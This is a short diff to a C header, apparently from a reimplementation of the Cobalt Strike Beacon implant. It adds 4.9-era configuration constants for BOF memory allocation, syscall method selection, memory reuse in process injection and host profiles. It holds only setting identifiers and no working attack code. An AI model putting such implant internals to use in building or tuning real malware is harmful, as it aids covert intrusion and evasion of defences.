@@ -46,7 +46,11 @@ typedef struct {
 #define DEPRECATED_SETTING_SPAWNTO 14
 #define SETTING_PIPENAME   15
 #define DEPRECATED_SETTING_KILLDATE_YEAR  16
+/* ^ RE-PURPOSED in 4.9 as the BOF allocator (0=VirtualAlloc, 1=MapViewOfFile, 2=HeapAlloc) */
+#define SETTING_BOF_ALLOCATOR   16
 #define DEPRECATED_SETTING_KILLDATE_MONTH 17
+/* ^ RE-PURPOSED in 4.9 as the syscall method selector (BeaconSyscallMethod) */
+#define SETTING_SYSCALL_METHOD  17
 #define DEPRECATED_SETTING_KILLDATE_DAY   18
 #define SETTING_DNS_IDLE       19
 #define SETTING_DNS_SLEEP      20
@@ -74,6 +78,8 @@ typedef struct {
 #define SETTING_PROCINJ_TRANSFORM_X86 46
 #define SETTING_PROCINJ_TRANSFORM_X64 47
 #define DEPRECATED_SETTING_PROCINJ_ALLOWED     48
+/* ^ RE-PURPOSED in 4.9: 1 = BOFs reuse injected memory (bof_reuse_memory) */
+#define SETTING_BOF_REUSE_MEMORY   48
 #define SETTING_BINDHOST            49
 #define SETTING_HTTP_NO_COOKIES     50
 #define SETTING_PROCINJ_EXECUTE     51
@@ -103,6 +109,11 @@ typedef struct {
 #define SETTING_MAX_RETRY_STRATEGY_ATTEMPTS   71
 #define SETTING_MAX_RETRY_STRATEGY_INCREASE   72
 #define SETTING_MAX_RETRY_STRATEGY_DURATION   73
+
+/* 4.9 additions (parsed generically by settings_init; consumed where noted) */
+#define SETTING_BOF_RESOURCE      74 /* .process-inject.bof_res blob */
+#define SETTING_HOST_PROFILES     75 /* 4.9 Host Profiles, up to 1024B — parsed, not yet consumed */
+#define SETTING_DATA_STORE_SIZE   76 /* .stage.data_store_size — parsed, not yet consumed */
 
 /* our various funks */
 #define EXIT_FUNK_PROCESS 0
